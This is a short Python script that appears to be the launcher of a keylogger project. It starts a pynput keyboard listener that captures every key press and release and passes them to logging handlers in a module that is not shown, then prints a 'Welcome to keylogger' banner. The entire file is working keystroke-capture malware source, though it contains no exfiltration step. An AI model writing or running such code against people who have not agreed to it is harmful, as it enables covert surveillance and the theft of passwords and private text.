from pynput import keyboard
from src.logger_sentences import on_press, on_release


def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print("Welcome to keylogger .............. START ............")
    start_keylogger()
